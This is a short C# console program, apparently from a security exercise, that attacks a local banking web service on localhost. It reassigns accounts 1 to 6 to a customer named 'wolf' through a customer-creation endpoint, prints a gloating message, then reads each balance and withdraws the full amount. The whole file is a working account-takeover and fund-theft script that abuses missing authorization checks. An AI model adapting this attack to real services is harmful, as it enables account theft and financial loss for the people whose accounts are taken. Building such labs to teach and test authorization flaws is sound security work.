using System;
using System.Collections.Generic;
using System.Net.Http;

namespace PerimetreDeConfiance
{
    class Program
    {
        private static readonly HttpClient client = new HttpClient();

        static async System.Threading.Tasks.Task Main(string[] args)
        {
            for(int i = 0; i < 6; i++)
            {
                await StealAccount(Convert.ToString(i+1));
            }
            Console.WriteLine("All account are mine!!!! MOUHAHAHAHAHAHAAHA!");
            for(int i = 0; i < 6; i++)
            {
                await Withdraw(Convert.ToString(i + 1));
            }
            

        }

        public static  async System.Threading.Tasks.Task  StealAccount(string id)
        {
            
                var values = new Dictionary<string, string>
                            {
                            { "id", id },
                            { "name", "wolf" },
                            { "account" , id}
                            };
                string pageUrl = "http://localhost:12345/customer/create";

                string responseString = await SendQuery(values, pageUrl);

                Console.WriteLine("Stealing account : " + responseString);
            
        }
        
        public static async System.Threading.Tasks.Task<string> SendQuery(Dictionary<string, string> values, string pageURL)
        {
            var content = new FormUrlEncodedContent(values);
            var response = await client.PostAsync(pageURL, content);
            var responseString = await response.Content.ReadAsStringAsync();
            return responseString;
        }

        public static async System.Threading.Tasks.Task Withdraw(string id)
        {
            var values = new Dictionary<string, string>
                            {
                            { "id", id }
                            };

            string pageUrl = "http://localhost:12345/accounts";

            var responseString = await SendQuery(values, pageUrl);
            string amountValue = ExtractAmount(responseString);


            values = new Dictionary<string, string>
                            {
                            { "id", id }, {"amount", amountValue}
                            };

            pageUrl = "http://localhost:12345/account/withdraw";

            responseString = await SendQuery(values, pageUrl);
            Console.WriteLine("I withdraw : " + amountValue + " (" + responseString + ")");

        }

        public static string ExtractAmount(string requestResult)
        {
            requestResult = requestResult.Replace('-', ' ');
            requestResult = requestResult.Trim();
            int LastTwoPoint = requestResult.LastIndexOf(':');
            requestResult = requestResult.Substring(LastTwoPoint + 1);
            return requestResult;
        }
        /*
        public static async System.Threading.Tasks.Task CreateNewCustomer(string idAccount)
        {

            var values = new Dictionary<string, string>
                        {
                            { "id","10"},
                            { "name", "wolf"},
                            { "account", idAccount}
                        };

            var content = new FormUrlEncodedContent(values);

            var response = await client.PostAsync("http://localhost:12345/customer/create", content);

            var responseString = await response.Content.ReadAsStringAsync();

            Console.WriteLine("Query 2 " + responseString);
            
        }

        public static async System.Threading.Tasks.Task ListAccounts()
        {

            var values = new Dictionary<string, string>
            { {"id", "10"}
                        };

            var content = new FormUrlEncodedContent(values);

            var response = await client.PostAsync("http://localhost:12345/accounts", null);

            var responseString = await response.Content.ReadAsStringAsync();

            Console.WriteLine("Accounts " + responseString);

        }
        */
    }

}
